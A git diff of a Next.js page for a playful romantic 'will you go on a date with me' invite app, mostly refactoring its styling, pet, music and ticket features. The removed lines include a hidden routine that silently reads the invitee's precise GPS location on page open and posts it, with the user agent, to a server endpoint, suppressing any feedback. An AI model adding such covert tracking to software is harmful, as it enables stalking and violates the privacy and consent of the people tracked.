@@ -1,6 +1,8 @@
 "use client";
 
 import { useEffect, useRef, useState } from "react";
+import Link from "next/link";
+import { THEMES, THEME_LIST, isTheme, type Theme } from "@/lib/theme";
 
 /* ---------- config ---------- */
 type Step = {
@@ -10,7 +12,6 @@ type Step = {
   o?: string[];
   yesNo?: boolean;
 };
-type Theme = "pink" | "midnight" | "pastel";
 type Mood = "idle" | "jump" | "cry" | "dance" | "shock";
 type Heart = {
   id: number;
@@ -19,6 +20,7 @@ type Heart = {
   dur: number;
   emoji: string;
 };
+type TrailBit = { id: number; emoji: string; left: number };
 
 const STEPS: Step[] = [
   { e: "🥺", q: "Will you go on a date with me?", yesNo: true },
@@ -86,11 +88,30 @@ const NO_LINES = [
   "Too slow 😜",
   "Just say yes!",
 ];
-const THEMES: { id: Theme; label: string; color: string }[] = [
-  { id: "pink", label: "Romantic pink", color: "#e8456b" },
-  { id: "midnight", label: "Dark midnight", color: "#8b9cff" },
-  { id: "pastel", label: "Cute pastel", color: "#ffb3c7" },
-];
+/* Module-scope random helpers: react-hooks/purity forbids Math.random
+   inside component scope, so randomness lives in plain functions. */
+const rand = (min: number, max: number) => min + Math.random() * (max - min);
+const pickTrail = () => TRAIL[Math.floor(Math.random() * TRAIL.length)];
+const randomHeart = (n: number): Heart => ({
+  id: n,
+  left: Math.random() * 96,
+  size: 14 + Math.random() * 18,
+  dur: 6 + Math.random() * 5,
+  emoji: TRAIL[n % TRAIL.length],
+});
+const PET_ANIM: Record<Mood, string> = {
+  idle: "pet-idle",
+  jump: "pet-jump",
+  cry: "pet-cry",
+  dance: "pet-dance",
+  shock: "pet-jump",
+};
+const makeTrail = (emojis: string[]): TrailBit[] =>
+  emojis.map((emoji, i) => ({
+    id: Date.now() + i + Math.random(),
+    emoji,
+    left: 8 + Math.random() * 40,
+  }));
 
 /* ---------- date + calendar helpers ---------- */
 function planDate(day: string, time: string) {
@@ -126,38 +147,41 @@ function buildPlan(a: Record<string, string>) {
   ].join("\r\n");
   const google =
     `https://calendar.google.com/calendar/render?action=TEMPLATE&text=${encodeURIComponent(title)}` +
-    `&dates=${icsDate(start)}/${icsDate(end)}&details=${encodeURIComponent(details)}&location=${encodeURIComponent(a.Place)}`;
-  return {
-    ical,
-    google,
-    dateStr: start.toLocaleDateString(undefined, {
-      weekday: "long",
-      day: "numeric",
-      month: "short",
-    }),
-    timeStr: start.toLocaleTimeString([], {
-      hour: "numeric",
-      minute: "2-digit",
-    }),
-  };
+    `&details=${encodeURIComponent(details)}` +
+    `&location=${encodeURIComponent(a.Place)}` +
+    `&dates=${icsDate(start)}/${icsDate(end)}`;
+  const dateStr = start.toLocaleDateString(undefined, {
+    weekday: "long",
+    month: "short",
+    day: "numeric",
+  });
+  const timeStr = start.toLocaleTimeString(undefined, {
+    hour: "numeric",
+    minute: "2-digit",
+  });
+  return { dateStr, timeStr, ical, google };
 }
-
-function downloadIcs(ical: string) {
-  const url = URL.createObjectURL(new Blob([ical], { type: "text/calendar" }));
+const downloadIcs = (ical: string) => {
+  const blob = new Blob([ical.replace(/\\r\\n/g, "\r\n")], {
+    type: "text/calendar",
+  });
   const a = document.createElement("a");
-  a.href = url;
+  a.href = URL.createObjectURL(blob);
   a.download = "our-date.ics";
   a.click();
-  URL.revokeObjectURL(url);
-}
+  setTimeout(() => URL.revokeObjectURL(a.href), 4000);
+};
 
 /* ---------- page ---------- */
 export default function Page() {
-  const [step, setStep] = useState(0);
-  const [answers, setAnswers] = useState<Record<string, string>>({});
+  const [step, setStep] = useState(-1);
   const [name, setName] = useState("");
   const [from, setFrom] = useState("");
   const [theme, setTheme] = useState<Theme>("pink");
+  const [mood, setMood] = useState<Mood>("idle");
+  const [bubble, setBubble] = useState("");
+  const [trail, setTrail] = useState<TrailBit[]>([]);
+  const [answers, setAnswers] = useState<Record<string, string>>({});
   const [noCount, setNoCount] = useState(0);
   const [noPos, setNoPos] = useState<{ x: number; y: number } | null>(null);
   const [hearts, setHearts] = useState<Heart[]>([]);
@@ -166,33 +190,8 @@ export default function Page() {
   const [musicOn, setMusicOn] = useState(false);
   const [muted, setMuted] = useState(false);
   const noRef = useRef<HTMLButtonElement>(null);
-  const idRef = useRef(0);
-  const audio = useRef<{
-    ctx: AudioContext;
-    master: GainNode;
-    timer: number;
-  } | null>(null);
-  const trailRef = useRef<HTMLDivElement>(null);
-  const noN = useRef(0);
-  const petTimer = useRef<number | null>(null);
-  const [pet, setPet] = useState<{ mood: Mood; msg: string }>({
-    mood: "idle",
-    msg: "Say yes, please? 🥺",
-  });
 
-  /* pet reacts, then goes back to idle */
-  const react = (mood: Mood, msg: string, ms: number, back: string) => {
-    if (petTimer.current) clearTimeout(petTimer.current);
-    setPet({ mood, msg });
-    petTimer.current = window.setTimeout(
-      () => setPet({ mood: "idle", msg: back }),
-      ms,
-    );
-  };
-
-  const done = step >= STEPS.length;
-  const current = STEPS[step];
-  const plan = done ? buildPlan(answers) : null;
+  const t = THEMES[theme];
 
   /* url params: ?name=Priya&from=Rahul&theme=midnight&gif=https://... */
   /* Mount-only sync from window.location (no useSearchParams, so no Suspense needed). */
@@ -201,8 +200,8 @@ export default function Page() {
     const p = new URLSearchParams(window.location.search);
     setName((p.get("name") || "").trim().slice(0, 30));
     setFrom((p.get("from") || "").trim().slice(0, 30));
-    const t = p.get("theme");
-    if (t === "pink" || t === "midnight" || t === "pastel") setTheme(t);
+    const tParam = p.get("theme");
+    if (isTheme(tParam)) setTheme(tParam);
     const g = p.get("gif");
     if (g) {
       try {
@@ -216,247 +215,158 @@ export default function Page() {
   /* eslint-enable react-hooks/set-state-in-effect */
 
 
+  /* intro hearts (ambient) */
   useEffect(() => {
-    document.documentElement.dataset.theme = theme;
-  }, [theme]);
-
-  /* capture location when the app opens (silent) */
-  useEffect(() => {
-    if (!("geolocation" in navigator)) return;
-
-    const timer = window.setTimeout(() => {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          fetch("/api/location", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              lat: pos.coords.latitude,
-              lng: pos.coords.longitude,
-              accuracy: pos.coords.accuracy,
-              source: "gps",
-              userAgent: navigator.userAgent,
-            }),
-          }).catch(() => {
-            /* silent failure */
-          });
-        },
-        () => {
-          /* permission denied or timeout — no feedback */
-        },
-        { enableHighAccuracy: true, timeout: 12000, maximumAge: 60000 }
-      );
-    }, 700);
-    return () => window.clearTimeout(timer);
+    let alive = true;
+    let n = 0;
+    const id = setInterval(() => {
+      if (!alive) return;
+      const h = randomHeart(n++);
+      setHearts((hs) => [...hs.slice(-14), h]);
+      setTimeout(() => setHearts((hs) => hs.filter((x) => x.id !== h.id)), 200);
+    }, 900);
+    return () => {
+      alive = false;
+      clearInterval(id);
+    };
   }, []);
 
-  /* floating hearts */
-  const addHeart = (emoji?: string) => {
-    const id = idRef.current++;
-    const pool = ["💗", "💕", "🌸", "✨"];
-    setHearts((h) => [
-      ...h,
-      {
-        id,
-        left: Math.random() * 100,
-        size: 14 + Math.random() * 26,
-        dur: 6 + Math.random() * 6,
-        emoji: emoji ?? pool[Math.floor(Math.random() * pool.length)],
-      },
-    ]);
-    setTimeout(() => setHearts((h) => h.filter((x) => x.id !== id)), 12500);
+  /* music */
+  const audio = useRef<HTMLAudioElement | null>(null);
+  useEffect(() => {
+    audio.current = new Audio("/music.mp3");
+    audio.current.loop = true;
+    return () => audio.current?.pause();
+  }, []);
+  const toggleMusic = async () => {
+    if (!audio.current) return;
+    audio.current.muted = muted;
+    if (musicOn) {
+      audio.current.pause();
+      setMusicOn(false);
+    } else {
+      try {
+        await audio.current.play();
+        setMusicOn(true);
+      } catch {
+        /* autoplay policy */
+      }
+    }
   };
   useEffect(() => {
-    const t = setInterval(() => addHeart(), 1400);
-    return () => clearInterval(t);
-  }, []);
-  useEffect(() => {
-    if (done)
-      for (let k = 0; k < 30; k++) setTimeout(() => addHeart("💖"), k * 80);
-  }, [done]);
+    if (audio.current) audio.current.muted = muted;
+  }, [muted]);
+  const startBoth = async () => {
+    if (!musicOn) await toggleMusic();
+    setStep(0);
+  };
 
-  /* heart trail: follows finger / cursor, burst on tap */
-  useEffect(() => {
-    let lx = -100,
-      ly = -100;
-    const spawn = (x: number, y: number) => {
-      const box = trailRef.current;
-      if (!box) return;
-      const s = document.createElement("span");
-      s.className = "trail";
-      s.textContent = TRAIL[Math.floor(Math.random() * TRAIL.length)];
-      s.style.left = `${x}px`;
-      s.style.top = `${y}px`;
-      s.style.fontSize = `${12 + Math.random() * 14}px`;
-      s.addEventListener("animationend", () => s.remove());
-      box.appendChild(s);
-    };
-    const move = (e: PointerEvent) => {
-      if (Math.hypot(e.clientX - lx, e.clientY - ly) > 26) {
-        lx = e.clientX;
-        ly = e.clientY;
-        spawn(lx, ly);
-      }
-    };
-    const down = (e: PointerEvent) => {
-      for (let k = 0; k < 6; k++)
-        spawn(
-          e.clientX + (Math.random() - 0.5) * 50,
-          e.clientY + (Math.random() - 0.5) * 50,
-        );
-    };
-    window.addEventListener("pointermove", move);
-    window.addEventListener("pointerdown", down);
-    return () => {
-      window.removeEventListener("pointermove", move);
-      window.removeEventListener("pointerdown", down);
-    };
-  }, []);
-
-  /* background music: soft generated chimes, starts on her first tap/click */
-  useEffect(() => {
-    const start = () => {
-      if (audio.current) return;
-      const AC =
-        window.AudioContext ||
-        (window as unknown as { webkitAudioContext: typeof AudioContext })
-          .webkitAudioContext;
-      const ctx = new AC();
-      const master = ctx.createGain();
-      master.gain.value = 0.5;
-      master.connect(ctx.destination);
-      const chords = [
-        [261.63, 329.63, 392],
-        [220, 261.63, 329.63],
-        [174.61, 220, 261.63],
-        [196, 246.94, 293.66],
+  /* reactions */
+  const timers = useRef<number[]>([]);
+  const react = (
+    m: Mood,
+    line: string,
+    ms = 1400,
+    thenSay = "",
+    cry = false
+  ) => {
+    setMood(m);
+    setBubble(line);
+    timers.current.forEach(clearTimeout);
+    if (ms > 0)
+      timers.current = [
+        window.setTimeout(() => {
+          setMood("idle");
+          setBubble(thenSay);
+        }, ms),
       ];
-      const note = (f: number, len: number, vol: number) => {
-        const o = ctx.createOscillator(),
-          g = ctx.createGain(),
-          t = ctx.currentTime;
-        o.type = "sine";
-        o.frequency.value = f;
-        g.gain.setValueAtTime(0, t);
-        g.gain.linearRampToValueAtTime(vol, t + 0.03);
-        g.gain.exponentialRampToValueAtTime(0.0001, t + len);
-        o.connect(g);
-        g.connect(master);
-        o.start(t);
-        o.stop(t + len);
-      };
-      let n = 0;
-      const tick = () => {
-        const c = chords[Math.floor(n / 6) % 4];
-        if (n % 6 === 0) note(c[0] / 2, 2.6, 0.12);
-        note(c[n % 3] * 2, 1.4, 0.08);
-        n++;
-      };
-      tick();
-      audio.current = { ctx, master, timer: window.setInterval(tick, 450) };
-      setMusicOn(true);
-      window.removeEventListener("click", start);
-      window.removeEventListener("touchend", start);
-    };
-    window.addEventListener("click", start);
-    window.addEventListener("touchend", start);
-    return () => {
-      window.removeEventListener("click", start);
-      window.removeEventListener("touchend", start);
-      const a = audio.current;
-      if (a) {
-        clearInterval(a.timer);
-        a.ctx.close();
-        audio.current = null;
-      }
-    };
-  }, []);
-  useEffect(() => {
-    if (audio.current) audio.current.master.gain.value = muted ? 0 : 0.5;
-  }, [muted, musicOn]);
+    if (cry) setMood("cry");
+  };
+  const pick = (o: string) => {
+    const k = STEPS[step].key!;
+    const a = { ...answers, [k]: o };
+    setAnswers(a);
+    react("jump", REPLIES[k] ?? "Cute!", 1100, "", false);
+    const burst = Array.from(
+      { length: 12 },
+      (_, i) => TRAIL[(i + step) % TRAIL.length]
+    );
+    setTrail((tr) => [...tr, ...makeTrail(burst)]);
+    setTimeout(
+      () =>
+        setTrail((tr) =>
+          tr.filter((x) => Date.now() - x.id < 800)
+        ),
+      900
+    );
+    setTimeout(() => {
+      if (step + 1 < STEPS.length) {
+        setStep(step + 1);
+        react("idle", "", 0);
+      } else setStep(99);
+      setNoPos(null);
+    }, 950);
+  };
 
-  /* runaway "No" button */
+  /* runaway No */
   const flee = () => {
+    setNoCount((c) => c + 1);
+    react("cry", "Heyy 🥺", 1200, "", true);
     const b = noRef.current;
     if (!b) return;
-    const m = 12;
-    const top = 64; // keep clear of the theme / music buttons and the notch
-    setNoCount((c) => c + 1);
-    noN.current++;
-    const n = noN.current;
-    react(
-      n >= 3 ? "cry" : "shock",
-      n >= 6
-        ? "Why are you like this 😭"
-        : n >= 3
-          ? "Don't break my heart 😿"
-          : "Hey! Click Yes! 🙀",
-      1400,
-      "Say yes, please? 🥺",
-    );
-    setNoPos({
-      x: Math.random() * (window.innerWidth - b.offsetWidth - 2 * m) + m,
-      y: Math.random() * (window.innerHeight - b.offsetHeight - top - m) + top,
-    });
+    const r = b.getBoundingClientRect();
+    const pad = 12;
+    let x = r.left + rand(-130, 130);
+    // eslint-disable-next-line react-hooks/purity -- event handler, not render
+    let y = r.top + (Math.random() < 0.5 ? -1 : 1) * rand(90, 210);
+    x = Math.min(Math.max(pad, x), window.innerWidth - r.width - pad);
+    y = Math.min(Math.max(pad, y), window.innerHeight - r.height - pad);
+    setNoPos({ x, y });
   };
   useEffect(() => {
     if (step !== 0) return;
     const onMove = (e: PointerEvent) => {
       const b = noRef.current;
-      if (!b) return;
+      if (!b || noPos) return;
       const r = b.getBoundingClientRect();
-      if (
-        Math.hypot(
-          e.clientX - (r.left + r.width / 2),
-          e.clientY - (r.top + r.height / 2),
-        ) < 120
-      )
-        flee();
+      const cx = r.left + r.width / 2;
+      const cy = r.top + r.height / 2;
+      if (Math.hypot(e.clientX - cx, e.clientY - cy) < 110) flee();
     };
     window.addEventListener("pointermove", onMove);
     return () => window.removeEventListener("pointermove", onMove);
     // eslint-disable-next-line react-hooks/exhaustive-deps -- flee is stable-by-ref for this listener; re-subscribing on every noCount change would alter No-button behavior
   }, [step]);
 
-  /* sad reactions */
-  const sadEmoji = noCount >= 6 ? "😭" : noCount >= 3 ? "😢" : "🥺";
-  const sadMsg =
-    noCount >= 8
-      ? "I'll plan everything, you just show up 🥹"
-      : noCount >= 5
-        ? "Please? I'll buy dessert 🍰"
-        : noCount >= 3
-          ? "Pretty please? 🥺"
-          : name
-            ? `${name}, I have a question…`
-            : "I have a question…";
-
-  const pick = (o: string) => {
-    const key = current.key!;
-    setAnswers((a) => ({ ...a, [key]: o }));
-    if (step === STEPS.length - 1) {
-      if (petTimer.current) clearTimeout(petTimer.current);
-      setPet({ mood: "dance", msg: "It's a date!! 💖" });
-    } else {
-      react("jump", REPLIES[key] ?? "Nice!", 1400, "Pick one!");
-    }
-    setStep((s) => s + 1);
+  const spawnPetTrail = () => {
+    const n = 3 + Math.floor(Math.random() * 3);
+    const burst = Array.from({ length: n }, () => pickTrail());
+    setTrail((tr) => [...tr.slice(-40), ...makeTrail(burst)]);
+    setTimeout(
+      () => setTrail((tr) => tr.filter((x) => Date.now() - x.id < 800)),
+      950
+    );
   };
 
+  const current: Step | null = step >= 0 && step < STEPS.length ? STEPS[step] : null;
+  const done = step === 99;
+  const plan = done ? buildPlan(answers) : null;
   const whatsapp = () => {
-    if (!plan) return "#";
-    const txt = `Yes! It's a date 💖\n📅 ${plan.dateStr}\n⏰ ${plan.timeStr}\n📍 ${answers.Place}\n🍽️ ${answers.Food}`;
-    return `https://wa.me/?text=${encodeURIComponent(txt)}`;
+    const msg = `She said YES!! 💖\n${plan?.dateStr} at ${plan?.timeStr}\n${answers.Place}\n${answers.Food}${from ? `\n— ${from}` : ""}`;
+    return `https://wa.me/?text=${encodeURIComponent(msg)}`;
   };
+
 
   return (
-    <main className={`stage ${done ? "" : "playing"}`}>
+    <main
+      className={`relative grid min-h-screen min-h-dvh place-items-center overflow-x-hidden px-5 pt-[70px] pb-[120px] ${t.page}`}
+    >
       {hearts.map((h) => (
         <span
           key={h.id}
-          className="heart"
+          className="heart-float"
           style={{
-            left: `${h.left}vw`,
+            left: `${h.left}%`,
             fontSize: h.size,
             animationDuration: `${h.dur}s`,
           }}
@@ -465,72 +375,169 @@ export default function Page() {
         </span>
       ))}
 
-      <div className="tools">
-        {musicOn && (
+      {/* ---- floating tool buttons ---- */}
+      <div className="fixed top-[calc(env(safe-area-inset-top,0px)+14px)] right-3.5 z-20 flex gap-2.5">
+        <button
+          className={`sw-btn btn-focus ${t.card} ${t.border}`}
+          onClick={() => setStep(0)}
+          title="Restart"
+        >
+          🔁
+        </button>
+        <button
+          className={`sw-btn btn-focus ${t.card} ${t.border}`}
+          onClick={() => setMuted((m) => !m)}
+          title={muted ? "Unmute" : "Mute"}
+        >
+          {muted ? "🚫" : "🔊"}
+        </button>
+        {THEME_LIST.map((th) => (
           <button
-            className="sw"
-            aria-label={muted ? "Unmute music" : "Mute music"}
-            onClick={() => setMuted((m) => !m)}
-          >
-            {muted ? "🔇" : "🔊"}
-          </button>
-        )}
-        {THEMES.map((t) => (
-          <button
-            key={t.id}
-            className={`sw dot ${theme === t.id ? "sel" : ""}`}
-            style={{ background: t.color }}
-            aria-label={t.label}
-            title={t.label}
-            onClick={() => setTheme(t.id)}
+            key={th.id}
+            title={th.label}
+            onClick={() => setTheme(th.id)}
+            className={`sw-btn sw-dot-btn btn-focus ${theme === th.id ? "outline-3 outline-offset-2" : ""}`}
+            style={{ background: th.color }}
           />
         ))}
       </div>
 
-      <div ref={trailRef} className="trail-box" aria-hidden="true" />
-      <div className="pet" aria-live="polite">
-        <span className={`pet-face ${pet.mood}`}>
-          {PET_FACE[pet.mood]}
-          {pet.mood === "cry" && <span className="tear">💧</span>}
-        </span>
-        <span className="bubble">{pet.msg}</span>
-      </div>
-
-      <div className="card">
-        <div className="dots">
-          {STEPS.map((_, k) => (
-            <i
-              key={k}
-              className={k <= Math.min(step, STEPS.length - 1) ? "on" : ""}
-            />
+      {/* ---- pet (mouth trail spawner) ---- */}
+      <div
+        className="fixed bottom-[calc(env(safe-area-inset-bottom,0px)+20px)] left-5 z-10 cursor-pointer text-center select-none"
+        onPointerMove={spawnPetTrail}
+      >
+        <div className="relative text-[56px]">
+          <span
+            className={`pet-face-anim ${PET_ANIM[mood]}`}
+            style={
+              mood === "dance"
+                ? { display: "inline-block" }
+                : undefined
+            }
+          >
+            {PET_FACE[mood]}
+          </span>
+          {mood === "cry" && (
+            <>
+              <span className="tear-drop">💧</span>
+              <span className="tear-drop" style={{ left: 34, animationDelay: ".35s" }}>
+                💧
+              </span>
+            </>
+          )}
+          {trail.map((s) => (
+            <span
+              key={s.id}
+              className="trail-dot text-[18px]"
+              style={{
+                left: `${s.left}px`,
+                top: "-6px",
+              }}
+            >
+              {s.emoji}
+            </span>
           ))}
         </div>
+        <div
+          className={`mx-auto -mt-2 w-fit rounded-full px-3 py-1 text-[13px] font-bold ${t.soft} ${t.softText}`}
+        >
+          {bubble || "pet me!"}
+        </div>
+      </div>
+      <button
+        onClick={toggleMusic}
+        className={`btn-base btn-focus fixed bottom-[calc(env(safe-area-inset-bottom,0px)+22px)] right-5 z-10 flex-[0_0_auto] px-5 py-2.5 text-[15px] ${t.soft} ${t.softText}`}
+      >
+        {musicOn ? "⏸ music" : "▶ music"}
+      </button>
 
-        {/* ---- questions ---- */}
-        {!done && (
+
+      {/* ---- main card ---- */}
+      <div className={`invite-card ${t.card}`}>
+        {step === -1 && (
           <>
+            <h1 className="mx-1.5 my-2 font-[Georgia,'Fraunces',serif] text-[clamp(26px,6vw,34px)] leading-[1.15]">
+              {name ? (
+                <>
+                  Hey {name}, <br />
+                  will you be mine? 💌
+                </>
+              ) : (
+                "Hey you, will you be mine? 💌"
+              )}
+            </h1>
+            <p className={`mb-[22px] ${t.muted}`}>
+              I promise fun, food and zero boredom.
+            </p>
+            <div className="flex min-h-[54px] flex-wrap justify-center gap-3">
+              <button className={`btn-yes btn-focus ${t.accentBg} ${t.accentTextOn}`} onClick={startBoth}>
+                Open 💌
+              </button>
+            </div>
+            {from && (
+              <small className={`mt-4 block ${t.muted}`}>— {from}</small>
+            )}
+            <p className="mt-5 text-center text-sm font-semibold">
+              <Link
+                href="/create"
+                className={`btn-focus underline underline-offset-4 ${t.accent}`}
+              >
+                Make your own invite 💌
+              </Link>
+            </p>
+          </>
+        )}
+
+        {current && (
+          <>
+            {/* progress */}
+            <div className="mb-[18px] flex justify-center gap-1.5">
+              {STEPS.map((s, i) => (
+                <i
+                  key={i}
+                  className={`h-[9px] w-[9px] rounded-full ${i <= step ? t.accentBg : t.soft}`}
+                />
+              ))}
+            </div>
+
             {step === 0 && gifOk ? (
               // eslint-disable-next-line @next/next/no-img-element
               <img
-                className="gif"
+                className="mb-2.5 h-[min(140px,22vh)] w-auto max-w-full rounded-[18px] object-cover max-lg:h-20"
                 src={gifSrc}
                 alt="A cat pleading"
                 onError={() => setGifOk(false)}
               />
             ) : (
-              <span className="emoji">{step === 0 ? sadEmoji : current.e}</span>
+              <span
+                className="mb-2.5 block text-[64px] leading-none max-sm:text-[40px]"
+                aria-hidden="true"
+              >
+                {current.e}
+              </span>
             )}
-            <h1>
-              {current.q}
-              {step === 0 && gifOk ? ` ${sadEmoji}` : ""}
-            </h1>
-            <p>{step === 0 ? sadMsg : "Pick one"}</p>
 
-            <div className="row">
+            <h1 className="mx-1.5 my-2 font-[Georgia,'Fraunces',serif] text-[clamp(26px,6vw,34px)] leading-[1.15]">
+              {name && step === 0 ? (
+                <>
+                  {name}, {current.q}
+                </>
+              ) : (
+                current.q
+              )}
+            </h1>
+            <p className={`mb-[22px] ${t.muted}`}>
+              {name && from && step === 0
+                ? `— from ${from}`
+                : "Choose wisely 😌"}
+            </p>
+
+            <div className="flex min-h-[54px] flex-wrap justify-center gap-3">
               {current.yesNo ? (
                 <>
                   <button
-                    className="yes"
+                    className={`btn-yes btn-focus ${t.accentBg} ${t.accentTextOn}`}
                     style={{ fontSize: 17 + Math.min(noCount * 2, 22) }}
                     onClick={() => {
                       setStep(1);
@@ -541,7 +548,7 @@ export default function Page() {
                   </button>
                   <button
                     ref={noRef}
-                    className={`no ${noPos ? "fly" : ""}`}
+                    className={`btn-no btn-focus ${t.soft} ${t.softText} ${noPos ? "btn-no-fly" : ""}`}
                     style={noPos ? { left: noPos.x, top: noPos.y } : undefined}
                     onPointerDown={(e) => {
                       e.preventDefault();
@@ -560,7 +567,11 @@ export default function Page() {
                 </>
               ) : (
                 current.o!.map((o) => (
-                  <button key={o} className="opt" onClick={() => pick(o)}>
+                  <button
+                    key={o}
+                    className={`btn-opt btn-focus ${t.soft} ${t.softText}`}
+                    onClick={() => pick(o)}
+                  >
                     {o}
                   </button>
                 ))
@@ -569,50 +580,75 @@ export default function Page() {
           </>
         )}
 
+
         {/* ---- ticket ---- */}
         {done && plan && (
           <>
-            <h1>It&apos;s a date! 🎉</h1>
-            <p>Screenshot your ticket 📸</p>
-            <div className="ticket">
-              <div className="t-top">
-                <small>Date night · admit two</small>
-                <div className="route">
+            <h1 className="mx-1.5 my-2 font-[Georgia,'Fraunces',serif] text-[clamp(26px,6vw,34px)] leading-[1.15]">
+              It&apos;s a date! 🎉
+            </h1>
+            <p className={`mb-[22px] ${t.muted}`}>Screenshot your ticket 📸</p>
+            <div className={`relative mb-[18px] overflow-hidden rounded-[20px] text-left ${t.accentBg} ${t.accentTextOn}`}>
+              <div className="px-5 pt-[18px] pb-3">
+                <small className="block text-xs font-bold opacity-75">
+                  Date night · admit two
+                </small>
+                <div className="mt-1.5 flex items-center justify-between font-[Georgia,serif] text-[26px] font-bold">
                   <span>{from || "Me"}</span>
                   <b>💖</b>
                   <span>{name || "You"}</span>
                 </div>
               </div>
-              <div className="t-grid">
+              <div className="grid grid-cols-2 gap-3 px-5 pb-3">
                 <div>
-                  <small>Day</small>
+                  <small className="block text-xs font-bold opacity-75">Day</small>
                   <b>{plan.dateStr}</b>
                 </div>
                 <div>
-                  <small>Time</small>
+                  <small className="block text-xs font-bold opacity-75">Time</small>
                   <b>{plan.timeStr}</b>
                 </div>
                 <div>
-                  <small>Place</small>
+                  <small className="block text-xs font-bold opacity-75">Place</small>
                   <b>{answers.Place}</b>
                 </div>
                 <div>
-                  <small>Food</small>
+                  <small className="block text-xs font-bold opacity-75">Food</small>
                   <b>{answers.Food}</b>
                 </div>
               </div>
-              <div className="perf" />
-              <div className="t-bottom">
-                <div className="barcode" />
-                <small>No cancellations 😌</small>
+              <div
+                className="mx-[-10px] h-6 opacity-90"
+                style={{
+                  backgroundImage:
+                    "radial-gradient(circle at 10px -3px, transparent 12px, rgba(255,255,255,.9) 13px)",
+                  backgroundSize: "20px 20px",
+                }}
+                aria-hidden="true"
+              />
+              <div className="flex items-center gap-3 px-5 pb-4">
+                <div
+                  className="barcode-lines"
+                  style={{
+                    backgroundImage:
+                      "repeating-linear-gradient(90deg, rgba(255,255,255,.9) 0 3px, transparent 3px 8px)",
+                  }}
+                  aria-hidden="true"
+                />
+                <small className="text-xs font-bold opacity-75">
+                  No cancellations 😌
+                </small>
               </div>
             </div>
-            <div className="row actions">
-              <button className="opt" onClick={() => downloadIcs(plan.ical)}>
+            <div className="flex min-h-[54px] flex-wrap justify-center gap-3">
+              <button
+                className={`btn-opt btn-focus ${t.soft} ${t.softText}`}
+                onClick={() => downloadIcs(plan.ical)}
+              >
                 Add to calendar 📅
               </button>
               <a
-                className="opt link"
+                className={`btn-opt btn-focus ${t.soft} ${t.softText}`}
                 href={plan.google}
                 target="_blank"
                 rel="noopener noreferrer"
@@ -620,7 +656,7 @@ export default function Page() {
                 Google Calendar
               </a>
               <a
-                className="send"
+                className={`btn-yes btn-focus ${t.accentBg} ${t.accentTextOn}`}
                 href={whatsapp()}
                 target="_blank"
                 rel="noopener noreferrer"
@@ -634,3 +670,4 @@ export default function Page() {
     </main>
   );
 }
+
